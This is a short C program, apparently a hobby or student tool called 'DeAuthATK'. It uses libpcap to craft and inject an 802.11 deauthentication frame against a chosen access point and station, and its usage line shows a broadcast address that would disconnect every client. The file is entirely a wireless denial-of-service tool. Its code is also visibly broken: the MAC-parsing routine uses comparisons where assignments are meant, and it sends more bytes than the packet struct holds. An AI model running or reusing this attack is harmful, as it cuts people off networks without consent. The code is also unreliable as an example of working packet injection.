#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
struct DeauthHd
{
    u_short FcF;
    u_short Dur;
    u_char APMac[6];
    u_char STAMac[6];
    u_char BSSID[6];
    u_short FSnumber;

};
struct DeauthBd
{
    u_short Rcode;
};

struct DeAuthentication {
    struct DeauthHd Dth;
    struct DeauthBd Dtb;
};

void usage()
{
    printf("syntax: DeAuthATK <interface> <AP mac> <STA mac>\n");
    printf("sample: DeAuthATK wlan0 11:22:33:44:55:66 ff:ff:ff:ff:ff:ff\n");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{
    if (argc != 4)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6]);

int main(int argc, char *argv[])
{

    if (!parse(&param, argc, argv))
        return -1;

    unsigned char * Interface = argv[1];
    unsigned char * AP_MAC = argv[2];
    unsigned char * STA_MAC = argv[3];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    
    struct DeAuthentication packet;
    //패킷 초기화 진행
    packet.Dth.FcF = 0xC000;//0xC000
    packet.Dth.Dur = 0x0;

    // ff:ff:ff:ff:ff:ff
    Mac_(AP_MAC,packet.Dth.APMac);
    Mac_(STA_MAC,packet.Dth.STAMac);
    Mac_(AP_MAC,packet.Dth.BSSID);
    packet.Dth.FSnumber = 0x0;
    packet.Dtb.Rcode = 0x0700;
    
    

    if (pcap_sendpacket(pcap, (char*)&packet, 62) != 0)
    {
        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
        return -1;
    }


    pcap_close(pcap);
}

void Mac_(const char *arr, u_char mac_addr[6]){
    int a;
    if(strlen(arr)!=17){
        printf("Maclen error!!\n");
    }
    
    char cpyarr[18];
    memcpy(cpyarr,arr,17);
    for(int i=0; i<6; i++){
        cpyarr[i*3+2]=='\0';
        sscanf(cpyarr,"%x",&a);
            mac_addr[i]==(u_char)a;
    }
}